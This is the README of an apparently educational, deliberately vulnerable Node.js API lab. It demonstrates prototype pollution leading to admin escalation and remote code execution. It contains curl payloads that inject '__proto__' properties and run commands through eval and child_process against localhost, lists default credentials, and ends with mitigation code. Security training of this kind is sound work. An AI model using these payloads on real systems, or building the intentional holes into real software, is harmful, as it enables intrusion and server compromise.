# 🚨 Vulnerable Node.js API - Prototype Pollution & RCE Demo

> **⚠️ SECURITY WARNING**: This project contains intentional security vulnerabilities for educational purposes only. **DO NOT DEPLOY IN PRODUCTION** or expose to untrusted networks.

## 📖 Overview

A deliberately vulnerable Node.js API demonstrating **Server-Side Prototype Pollution** vulnerabilities that can lead to **Remote Code Execution (RCE)**. This project showcases how prototype pollution can be chained with authentication bypass to achieve full server compromise.

## 🎯 Learning Objectives

- Understand prototype pollution vulnerabilities in Node.js
- Learn how to exploit prototype pollution to bypass authentication
- Demonstrate RCE through polluted object prototypes
- Practice secure coding practices to prevent these vulnerabilities

## 🏗️ Project Structure

```
prototype-pollution-rce-api/
├── server.js                # Main server file
├── config/
│   └── database.js          # Database configuration (vulnerable)
├── middleware/
│   ├── auth.js              # JWT authentication (vulnerable)
├── routes/
│   ├── auth.js              # Authentication routes
│   ├── users.js             # User management (vulnerable)
│   ├── admin.js             # Admin routes with RCE
├── utils/
│   └── helpers.js           # Utility functions (vulnerable)
├── data/
│   └── database.json        # File-based database
└── package.json
```

## 🔥 Vulnerabilities Included

### 1. Prototype Pollution
- **Unsafe object merging** in user registration and updates
- **Direct assignment** of user input without validation
- **Pollutable JWT authentication** checks
- **Vulnerable search and filter functions**

### 2. Authentication Bypass
- **JWT role verification** that checks polluted prototypes
- **Admin privilege escalation** through prototype pollution

### 3. Remote Code Execution (RCE)
- **Command injection** via child process execution
- **JavaScript evaluation** using eval()
- **Template injection** vulnerabilities

## 🚀 Quick Start

### Prerequisites
- Node.js 14+ 
- npm or yarn

### Installation

1. **Clone the repository**
```bash
git clone https://github.com/fredrik-stigsson/prototype-pollution-rce-api.git
cd prototype-pollution-rce-api
```

2. **Install dependencies**
```bash
npm install
```

3. **Start the server**
```bash
npm start
```

The API will start on `http://localhost:3000`

## 📚 API Endpoints

### Authentication (`/auth`)
| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| `POST` | `/auth/login` | User login | - |
| `POST` | `/auth/register` | User registration | 🔴 **Prototype Pollution** |

### Users (`/users`) - Requires Authentication
| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| `GET` | `/users/me` | Get current user profile | - |
| `PUT` | `/users/me` | Update user profile | 🔴 **Prototype Pollution** |
| `GET` | `/users` | Get all users (admin) | - |
| `GET` | `/users/:id` | Get user by ID | - |
| `POST` | `/users/search` | Search users | 🔴 **Prototype Pollution** |
| `DELETE` | `/users/me` | Delete user account | - |

### Admin (`/admin`) - Requires Admin Authentication
| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| `POST` | `/admin/execute` | Execute commands | 🔴 **RCE** |
| `POST` | `/admin/eval` | Evaluate JavaScript | 🔴 **RCE** |
| `GET` | `/admin/system-info` | System information | 🔴 **Info Leak** |

## 🔓 Default Credentials

| Role | Email | Password |
|------|-------|----------|
| Admin | `admin@example.com` | `admin123` |
| User | `user@example.com` | `user123` |

## 💥 Attack Demonstrations

### 1. Prototype Pollution to Admin Escalation

**Register user with prototype pollution**
```bash
curl -X POST http://localhost:3000/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "attack123",
    "name": "Attacker",
    "profile": {
      "__proto__": {
        "isAdmin": true,
        "exposeEnv": true
      }
    }
  }'
```

**Search users with prototype pollution**
```bash
curl -X POST http://localhost:3000/users/search \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "filters": {
      "__proto__": {
        "isAdmin": true,
        "exposeEnv": true
      }
    }
  }'
```

**Update user with prototype pollution**
```bash
curl -X PUT http://localhost:3000/users/me \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "updates": {
      "preferences": {
        "__proto__": {
          "isAdmin": true,
          "exposeEnv": true
        }
      }
    }
  }'
```

### 2. Remote Code Execution (RCE)

**Execute system commands (requires admin)**
```bash
curl -X POST http://localhost:3000/admin/execute \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "whoami"
  }'
```

**JavaScript evaluation**
```bash
curl -X POST http://localhost:3000/admin/eval \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "code": "require(\"child_process\").execSync(\"whoami\").toString()"
  }'
```

## 🛡️ Mitigation Strategies

### 1. Safe Object Operations
```javascript
// Use Object.create(null) for objects that shouldn't inherit
const safeObject = Object.create(null);

// Safe object merge
function safeMerge(target, source) {
    for (const key in source) {
        if (key !== '__proto__' && key !== 'constructor' && key !== 'prototype') {
            target[key] = source[key];
        }
    }
    return target;
}
```

### 2. Input Validation
```javascript
const schema = Joi.object({
    email: Joi.string().email().required(),
    password: Joi.string().min(8).required(),
    name: Joi.string().required()
});
```

### 3. Protect Built-in Prototypes
```javascript
// Freeze built-in prototypes
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
```

### 4. Avoid Dangerous Functions
- Avoid `eval()`
- Use parameterized queries
- Validate and sanitize all inputs
- Use safe template engines

## 🧪 Testing

### Manual Testing
Use the provided curl commands or tools like:
- **Postman**
- **curl**
- **Burp Suite**

## ⚠️ Responsible Disclosure

This project is intended for:
- 🎓 Security education and training
- 🔍 Vulnerability research in controlled environments
- 🛡️ Secure code development practice

**Never use this code in:**
- ❌ Production environments
- ❌ Public-facing applications
- ❌ Systems handling real user data

## 📄 License

This project is for educational purposes only. Use responsibly.

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request

## 🆘 Getting Help

- Create an issue for bug reports
- Check existing issues for solutions
- Use for educational purposes only

---

**Remember**: With great power comes great responsibility. Use this knowledge to build more secure applications, not to exploit them. 🔐